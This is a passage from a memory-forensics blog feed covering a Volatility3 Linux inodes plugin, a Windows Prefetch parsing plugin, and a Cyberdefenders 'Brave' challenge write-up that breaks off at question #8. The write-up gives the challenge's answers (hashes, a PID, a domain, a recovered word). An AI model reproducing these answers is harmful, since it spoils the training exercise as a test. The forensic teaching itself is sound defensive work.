<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">~/work/DFIR/Memory Analysis/MemoryImages/debian 5.10.0-18-amd64 ¬ª vol -f Debian\ XFS.vmem -s symbols linux.inodes</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Volatility 3 Framework 2.0.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Progress:  100.00		Stacking attempts finished</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PID	Process	Inode	Mode	File	LastChange	LastModify	LastAccessed	Size</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2555	firefox-esr	52709413	-rw-r--r--	/home/volatility/.mozilla/firefox/k2jz4psu.default-esr/places.sqlite-wal	2022-09-11 22:05:11.000000 	2022-09-11 22:05:11.000000 	2022-09-11 22:05:12.000000 	2164304</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2555	firefox-esr	34057200	-rw-r--r--	/home/volatility/.mozilla/firefox/k2jz4psu.default-esr/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.sqlite-wal	2022-09-11 22:05:04.000000 	2022-09-11 22:05:04.000000 	2022-09-11 22:05:04.000000 	0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2555	firefox-esr	52709410	-rw-r--r--	/home/volatility/.mozilla/firefox/k2jz4psu.default-esr/places.sqlite	2022-09-11 22:05:04.000000 	2022-09-11 22:05:04.000000 	2022-09-11 22:05:04.000000 	5242880</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2555	firefox-esr	52709413	-rw-r--r--	/home/volatility/.mozilla/firefox/k2jz4psu.default-esr/places.sqlite-wal	2022-09-11 22:05:11.000000 	2022-09-11 22:05:11.000000 	2022-09-11 22:05:12.000000 	2164304</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2555	firefox-esr	52709411	-rw-r--r--	/home/volatility/.mozilla/firefox/k2jz4psu.default-esr/favicons.sqlite	2022-09-11 22:05:01.000000 	2022-09-11 22:05:01.000000 	2022-09-11 22:05:01.000000 	5242880</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2555	firefox-esr	52709412	-rw-r--r--	/home/volatility/.mozilla/firefox/k2jz4psu.default-esr/favicons.sqlite-wal	2022-09-11 22:05:11.000000 	2022-09-11 22:05:11.000000 	2022-09-11 22:05:01.000000 	1147752</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2555	firefox-esr	52709414	-rw-r--r--	/home/volatility/.mozilla/firefox/k2jz4psu.default-esr/content-prefs.sqlite	2022-09-11 22:05:02.000000 	2022-09-11 22:05:02.000000 	2022-09-11 22:05:03.000000 	229376</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2555	firefox-esr	35077	srwxrwxrwx	socket:[35077]	1970-01-01 01:00:00.000000 	1970-01-01 01:00:00.000000 	1970-01-01 01:00:00.000000 	0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2555	firefox-esr	32451	srwxrwxrwx	socket:[32451]	1970-01-01 01:00:00.000000 	1970-01-01 01:00:00.000000 	1970-01-01 01:00:00.000000 	0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2555	firefox-esr	32393	srwxrwxrwx	socket:[32393]	1970-01-01 01:00:00.000000 	1970-01-01 01:00:00.000000 	1970-01-01 01:00:00.000000 	0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2555	firefox-esr	32457	srwxrwxrwx	socket:[32457]	1970-01-01 01:00:00.000000 	1970-01-01 01:00:00.000000 	1970-01-01 01:00:00.000000 	0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2555	firefox-esr	32455	srwxrwxrwx	socket:[32455]	1970-01-01 01:00:00.000000 	1970-01-01 01:00:00.000000 	1970-01-01 01:00:00.000000 	0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2555	firefox-esr	32470	srwxrwxrwx	socket:[32470]	1970-01-01 01:00:00.000000 	1970-01-01 01:00:00.000000 	1970-01-01 01:00:00.000000 	0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2555	firefox-esr	31746	srwxrwxrwx	socket:[31746]	1970-01-01 01:00:00.000000 	1970-01-01 01:00:00.000000 	1970-01-01 01:00:00.000000 	0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2555	firefox-esr	31748	prw-------	pipe:[31748]	2022-09-11 22:05:02.000000 	2022-09-11 22:05:02.000000 	2022-09-11 22:05:02.000000 	0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2555	firefox-esr	34057193	-rw-r--r--	/home/volatility/.mozilla/firefox/k2jz4psu.default-esr/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite	2022-09-11 22:05:07.000000 	2022-09-11 22:05:07.000000 	2022-09-11 22:05:11.000000 	507904</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2555	firefox-esr	34057204	-rw-r--r--	/home/volatility/.mozilla/firefox/k2jz4psu.default-esr/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite-wal	2022-09-11 22:05:07.000000 	2022-09-11 22:05:07.000000 	2022-09-11 22:05:07.000000 	0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The fact that we have extracted timestamps makes it possible to build the timeline of the events via the integration to the <strong>Timeliner</strong> plugin.</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">~/work/DFIR/Memory Analysis/MemoryImages/debian 5.10.0-18-amd64 ¬ª vol -f Debian\ XFS.vmem -s symbols timeline | more                                                                                              130 ‚Üµ k1nd0ne@MacBook-Pro-de-Felix</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Volatility 3 Framework 2.0.1    Running plugin Bash...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Plugin  Description     Created Date    Modified Date   Accessed Date   Changed Date</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Bash    2490 (bash): "echo "hello bash history""        2022-09-11 20:04:52.000000      N/A     N/A     N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Inodes  Process firefox-esr (2555) Open "/usr/lib/firefox-esr/browser/extensions/langpack-fr@firefox-esr.mozilla.org.xpi"       N/A     2022-08-23 23:09:13.000000      2022-09-11 22:04:59.000000      2022-09-11 21:51:29.000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Inodes  Process firefox-esr (2555) Open "/usr/lib/firefox-esr/browser/features/doh-rollout@mozilla.org.xpi"     N/A     2022-08-23 23:09:13.000000      2022-09-11 22:04:59.000000      2022-09-11 21:51:29.000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Inodes  Process firefox-esr (2555) Open "/usr/lib/firefox-esr/browser/features/formautofill@mozilla.org.xpi"    N/A     2022-08-23 23:09:13.000000      2022-09-11 22:04:59.000000      2022-09-11 21:51:29.000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Inodes  Process firefox-esr (2555) Open "/usr/lib/firefox-esr/browser/features/pictureinpicture@mozilla.org.xpi"        N/A     2022-08-23 23:09:13.000000      2022-09-11 22:04:59.000000      2022-09-11 21:51:29.000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Inodes  Process firefox-esr (2555) Open "/usr/lib/firefox-esr/browser/features/proxy-failover@mozilla.com.xpi"  N/A     2022-08-23 23:09:13.000000      2022-09-11 22:04:59.000000      2022-09-11 21:51:29.000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Inodes  Process firefox-esr (2555) Open "/usr/lib/firefox-esr/browser/features/screenshots@mozilla.org.xpi"     N/A     2022-08-23 23:09:13.000000      2022-09-11 22:04:59.000000      2022-09-11 21:51:29.000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Inodes  Process firefox-esr (2555) Open "/usr/lib/firefox-esr/browser/features/webcompat@mozilla.org.xpi"       N/A     2022-08-23 23:09:13.000000      2022-09-11 22:04:59.000000      2022-09-11 21:51:29.000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Inodes  Process Privileged Cont (2626) Open "/usr/lib/firefox-esr/browser/extensions/langpack-fr@firefox-esr.mozilla.org.xpi"   N/A     2022-08-23 23:09:13.000000      2022-09-11 22:04:59.000000      2022-09-11 21:51:29.000000</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion">Conclusion<a href="https://forensicxlab.github.io/blog/inodes#conclusion" class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion">‚Äã</a></h2>
<p>To conclude, this plugin is a good way to an in depth understanding of how a Linux kernel is storing files in memory and what are the information you can extract from a Linux memory acquisitions.  This plugin was tested on a Debian with kernel version <strong>5.10.0.18-amd64</strong>. The plugin is available on the forensicxlab github repository: <a href="https://github.com/forensicxlab/volatility3_plugins" target="_blank" rel="noopener noreferrer">https://github.com/forensicxlab/volatility3_plugins</a>.
You should identify each steps described before in the source code comments.
Do not hesitate to reach me at <a href="mailto:felix.guyard@forensicxlab.com" target="_blank" rel="noopener noreferrer">felix.guyard@forensicxlab.com</a> to make this article better, or to make a pull-request on the repository to enhance this plugin.</p>
<p>Happy Hunting!</p>
<p><a href="https://www.kernel.org/doc/html/latest/filesystems/vfs.html" target="_blank" rel="noopener noreferrer">https://www.kernel.org/doc/html/latest/filesystems/vfs.html</a></p>
<p><a href="http://books.gigatux.nl/mirror/kerneldevelopment/0672327201/ch12lev1sec7.html" target="_blank" rel="noopener noreferrer">http://books.gigatux.nl/mirror/kerneldevelopment/0672327201/ch12lev1sec7.html</a></p>
<p><a href="http://books.gigatux.nl/mirror/kerneldevelopment/0672327201/ch12lev1sec6.html" target="_blank" rel="noopener noreferrer">http://books.gigatux.nl/mirror/kerneldevelopment/0672327201/ch12lev1sec6.html</a></p>
<p><a href="https://github.com/torvalds/linux" target="_blank" rel="noopener noreferrer">https://github.com/torvalds/linux</a></p>
<p><a href="https://volatility3.readthedocs.io/en/latest/index.html" target="_blank" rel="noopener noreferrer">https://volatility3.readthedocs.io/en/latest/index.html</a></p>]]></content:encoded>
            <category>DFIR</category>
            <category>Memory Forensics</category>
            <category>VFS</category>
            <category>Inodes</category>
            <category>Linux</category>
        </item>
        <item>
            <title><![CDATA[üì¶ Volatility3 Windows Plugin - Prefetch]]></title>
            <link>https://forensicxlab.github.io/blog/prefetch</link>
            <guid>https://forensicxlab.github.io/blog/prefetch</guid>
            <pubDate>Wed, 27 Jul 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[Windows prefetch files are temporary files stored in the %SystemRoot%\System\Prefetch folder. This memory management feature is keeping track of the frequently running applications on a given system. We can extract some data from those files in order to get useful information for a digital forensic investigation. In this blog article, I will explain how we can use memory forensic to extract prefetch files, parse them and create in the end a volatility3 plugin.]]></description>
            <content:encoded><![CDATA[<p>Windows prefetch files are temporary files stored in the <strong><code>%SystemRoot%\System\Prefetch</code></strong> folder. This memory management feature is keeping track of the frequently running applications on a given system. We can extract some data from those files in order to get useful information for a digital forensic investigation. In this blog article, I will explain how we can use memory forensic to extract prefetch files, parse them and create in the end a volatility3 plugin.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="windows-prefetch-file-format">Windows Prefetch file format<a href="https://forensicxlab.github.io/blog/prefetch#windows-prefetch-file-format" class="hash-link" aria-label="Direct link to Windows Prefetch file format" title="Direct link to Windows Prefetch file format">‚Äã</a></h2>
<p>Windows prefetch files are constructed with one file header and multiple sections. In each sections different information can be found in which there can be some interesting valuable forensic artifacts. With the evolution of the Windows versions, prefetch files format changed we will see later those changes and the differences between them. Integers are stored in little-endian order, Strings in UTF-16 little-endian and Timestamp in Windows FILETIME UTC. You can see bellow a representation of a prefetch file header and how the information is stored:</p>
<div style="background-color:white;align-items:center"><p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/screenshot-e4464d35f4c066cc4d3d266964b3db4a.png" title="Prefetch header" width="786" height="330" class="img_ev3q"></p></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="format-version">Format version:<a href="https://forensicxlab.github.io/blog/prefetch#format-version" class="hash-link" aria-label="Direct link to Format version:" title="Direct link to Format version:">‚Äã</a></h3>
<p>For the different windows versions, the prefetch format version is different:</p>
<ul>
<li>17 (0x11) - Windows XP, Windows 2003</li>
<li>23 (0x17) - Windows Vista, Windows 7</li>
<li>26 (0x1a) - Windows 8.1</li>
<li>30 (0x1e) - Windows 10</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="signature">Signature:<a href="https://forensicxlab.github.io/blog/prefetch#signature" class="hash-link" aria-label="Direct link to Signature:" title="Direct link to Signature:">‚Äã</a></h3>
<ul>
<li>SCCA - Windows XP to Windows 8.1</li>
<li>MAM ‚Äì Windows 10/11</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="original-executable-name-and-hash">Original executable name and hash:<a href="https://forensicxlab.github.io/blog/prefetch#original-executable-name-and-hash" class="hash-link" aria-label="Direct link to Original executable name and hash:" title="Direct link to Original executable name and hash:">‚Äã</a></h3>
<p>The two information are present in the header but are also present in the prefetch filename stored on the disk (ExecutableName.EXE-Hash).pf. The hash is use to differentiate multiple execution of the same executable.</p>
<p>Now that we have the header information, we can extract other artifacts from the file information sections.</p>
<p>For each different file version, the prefetch file information are not located at the same offset. Here is the interesting information we can find about the executable:</p>
<ul>
<li>Section A, B, C, and D offset and entries information ‚Äì Useful to locate our artifacts</li>
<li>Last Execution - Latest execution time of the executable.</li>
<li>Execution Counter ‚Äì How many times the executable was run.</li>
</ul>
<p>Each of those information are located at different offsets. Depending on the file version, those offsets are not the same. You can find for each version the associated offsets <a href="https://github.com/libyal/libscca/blob/main/documentation/Windows%20Prefetch%20File%20(PF)%20format.asciidoc" target="_blank" rel="noopener noreferrer">here</a></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="the-mam-signature">The MAM signature:<a href="https://forensicxlab.github.io/blog/prefetch#the-mam-signature" class="hash-link" aria-label="Direct link to The MAM signature:" title="Direct link to The MAM signature:">‚Äã</a></h3>
<p>SCCA signature indicates that the file information is stored in plain text whereas the MAM signature indicates a compressed prefetch file. MAM Signature are present in Windows 10 and 11 prefetch files only and needs to be decompressed before it can be read. The compression method used is called XPRESS Huffman which is a Microsoft compression algorithm. We‚Äôll see later the python3 implementation of this algorithm used for the volatility3 plugin.</p>
<p>If you are doing forensic on a hard drive, you probably know the Windows Prefetch Parser tool by Eric Zimmermann. However, there is no tool extracting prefetch file artifacts from memory. To this end, we are now going to see the extraction and parsing of prefetch files with volatility3.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="volatility3-prefetch-plugin">Volatility3 Prefetch plugin<a href="https://forensicxlab.github.io/blog/prefetch#volatility3-prefetch-plugin" class="hash-link" aria-label="Direct link to Volatility3 Prefetch plugin" title="Direct link to Volatility3 Prefetch plugin">‚Äã</a></h2>
<p>To be able to extract the prefetch file and parse them from a memory dump, we need to go through theses major steps:</p>
<ul>
<li>Scan for prefetch files using the ‚Äúfilescan‚Äù plugin;</li>
<li>Dump each prefetch file in a bytearray;</li>
<li>Identify each Prefetch signature and decompress it if necessary (MAM signature);</li>
<li>Parse the Prefetch and extract the interesting artifacts;</li>
<li>Render the result.</li>
</ul>
<p>When developing the plugin, I had to implement the Microsoft's XPRESS Huffman decompression algorithm in python3 to be able to read Windows 1.X prefetch files. I have used the provided Microsoft pseudo code of the algorithm available . The python3 implementation of the algorithm itself is available on the forensicxlab's github : <a href="https://github.com/forensicxlab/Xpress_LZ77Huffman" target="_blank" rel="noopener noreferrer">https://github.com/forensicxlab/Xpress_LZ77Huffman</a> The volatility plugin is using a derived version of this algorithm, which will return the file even if the PF is incomplete so we can extract information.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/results-d2e8f03149ec9b844ef13b80b131b3f9.png" title="Prefetch header" width="1210" height="562" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion">Conclusion<a href="https://forensicxlab.github.io/blog/prefetch#conclusion" class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion">‚Äã</a></h2>
<p>The plugin was tested on Windows 7, Windows 8.1 and Windows 10 vmem memory dumps. The plugin code can be found on the forensicxlab's github and will be submitted to the volatility3 community for a potential integration to the framework. You should Identify each steps described before in the source code comments. Do not hesitate to reach me at <a href="mailto:felix.guyard@forensicxlab.com" target="_blank" rel="noopener noreferrer">felix.guyard@forensicxlab.com</a>, or to make a pull-request on the repository to enhance this plugin or this article.</p>
<p>Happy Hunting!</p>]]></content:encoded>
            <category>DFIR</category>
            <category>Memory Forensics</category>
            <category>Prefetch</category>
            <category>Windows</category>
        </item>
        <item>
            <title><![CDATA[üñã Cyberdefenders - Writeup - Brave]]></title>
            <link>https://forensicxlab.github.io/blog/cb-brave</link>
            <guid>https://forensicxlab.github.io/blog/cb-brave</guid>
            <pubDate>Mon, 11 Jul 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[This writeup is covering the cyberdefenders.org challenge named "Brave". Today we are going to solve this challenge using the VolWeb memory analysis platform.]]></description>
            <content:encoded><![CDATA[<p>This writeup is covering the cyberdefenders.org challenge named "Brave". Today we are going to solve this challenge using the VolWeb memory analysis platform.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="scenario">Scenario<a href="https://forensicxlab.github.io/blog/cb-brave#scenario" class="hash-link" aria-label="Direct link to Scenario" title="Direct link to Scenario">‚Äã</a></h2>
<p>A memory image was taken from a seized Windows machine. Analyze the image and answer the provided questions.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="analysis-creation">Analysis creation<a href="https://forensicxlab.github.io/blog/cb-brave#analysis-creation" class="hash-link" aria-label="Direct link to Analysis creation" title="Direct link to Analysis creation">‚Äã</a></h2>
<p>After firing up your instance of VolWeb, login to the platform, create a new Windows investigation and upload the challenge memory image. Once the image is uploaded, launch the analysis from the "Analysis" menu. Next, select the analysis and click on the "Review results" button.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/1-5b240a8c2d7fa5b9121a2f8c0ff47bfd.png" title="Analysis Creation" width="1283" height="676" class="img_ev3q"></p>
<p>From there, we can start our investigation on the memory image using the left panel (clicking on the "Plugins" button). From the displayed menu named "Case", we have the information we need to answer question <strong>#2</strong> about the SHA256 value of the RAM image which is : <strong>9db01b1e7b19a3b2113bfb65e860fffd7a1630bdf2b18613d206ebf2aa0ea172</strong></p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/1.1-2dbab51988457fb9443d322b1787a040.png" title="Analysis Hash" width="710" height="85" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="process-analysis">Process Analysis<a href="https://forensicxlab.github.io/blog/cb-brave#process-analysis" class="hash-link" aria-label="Direct link to Process Analysis" title="Direct link to Process Analysis">‚Äã</a></h2>
<p>Let's try to find what tool were used to dump the memory of this machine and at the same time, identify the PID of "brave.exe" to answer question <strong>#1</strong> &amp; <strong>#3</strong>. For this we are going to go through the process tree graph.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/2-14215d392ee1b6bb5a91e82fa46e80d2.png" title="PSTree" width="970" height="464" class="img_ev3q">
<img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/3-977eec9fd985c1193517ad591d214d4c.png" title="PSTree" width="958" height="751" class="img_ev3q"></p>
<p>Using this plugin, we immediately have the process ID of brave.exe which is 4856 and thus, is the answer for question <strong>#3</strong>. If we look deeper into the tree we can also spot "FTK Imager" which is a known forensic tool that can be used to dump memory from a live system.</p>
<p>To answer question <strong>#1</strong>, we need to find the time at which the RAM image was fully acquired. For this, I like to use the timeline plugin. It's always good to take a look at the timeline to take a step back and have a good view of the activities registered on the machine in time. We can try to identify the time at which the memory dump was finished by looking for the FTK Imager activities. We know that when the dumping procedure is finished, we have no more information registered, which means we need to identify the last event timestamp recorded.</p>
<p>Looking at the timeline, we find the following :</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/4-b74cf91df1136ecb2bb9cae11391e9f4.png" title="PSTree" width="1743" height="323" class="img_ev3q"></p>
<p>This timestamp <strong>2021-04-30 17:52:18</strong> is the latest identified. By looking at the cyberdefenders challenge, we know that the last digit of the answer is "19" which is one second greater than our result. The answer for question <strong>#1</strong> is indeed 2021-04-30 17:52:19.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="network-analysis">Network analysis<a href="https://forensicxlab.github.io/blog/cb-brave#network-analysis" class="hash-link" aria-label="Direct link to Network analysis" title="Direct link to Network analysis">‚Äã</a></h2>
<p>To answer question #4, we can use the netscan and the netstat plugin. By using the search bar, we can look for the key word "ESTABLISHED" and count how many connections are identified : For this question, the "netstat" plugin is returning 10 connections marked as ESTABLISHED, and only 9 connections for the "netscan" plugin. The answer for question <strong>#4</strong> is indeed <strong>10</strong>.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/5-06fdbf953c2fe41621118d7178caa6f2.png" title="PSTree" width="1445" height="620" class="img_ev3q"></p>
<p>For the next question, we are looking for a FQDN that the chrome process established a connection with. By looking at the IP contacted by the chrome processes, we can extract some public IP addresses.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/6-03cccc2a9bfb95efc77487014be420bf.png" title="PSTree" width="605" height="385" class="img_ev3q"></p>
<p>Using the tool of your choice, you can search for the FQDN linked to IP addresses we have found. To conclude, the domain is <strong>protonmail.ch</strong>, which is the right answer for question <strong>#5</strong>.</p>
<p>The next question is asking us the MD5 hash value of process memory for PID 6988. For this one, we are going to look for the process using the "Process" tab and look at the left panel to dump our process and calculate the signature.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/7-c6b2029ad2d4b5b162fc3f405999a79c.png" title="PSTree" width="285" height="243" class="img_ev3q">
<img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/7.1-ee6bbd501fedc73d6b941cd481739c31.png" title="PSTree" width="1242" height="43" class="img_ev3q"></p>
<p>Then answer for question <strong>#6</strong> is indeed <strong>0b493d8e26f03ccd2060e0be85f430af</strong>.</p>
<p>For the next question we need to go fetch the word starting at offset 0x45BE876 with a length of 6 bytes in the memory dump. We can write a simple python3 script to do this.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> sys</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">with</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">open</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">sys</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">argv</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token string" style="color:rgb(255, 121, 198)">"rb"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">as</span><span class="token plain"> process</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   process</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seek</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">0x45BE876</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   word </span><span class="token operator">=</span><span class="token plain"> process</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">read</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">6</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">word</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>OUTPUT :</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">~/work/DFIR/Cyberdefender/c49-AfricanFalls2 ¬ª python3 extract.py 20210430-Win10Home-20H2-64bit-memdump.mem                                                                                                           k1nd0ne@MacBook-Pro-de-Felix</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">b'hacker'</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The answer is indeed "<strong>hacker</strong>" for question <strong>#7</strong>.</p>
<p>Question <strong>#8</strong> is pretty straight forward, just go back to using the ProcessTree plugin and fetch the PPID of "powershell.exe".</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/8-fbd628376fd5a2f03acebec5b34b2d75.png" title="PSTree" width="770" height="752" class="img_ev3q"></p>
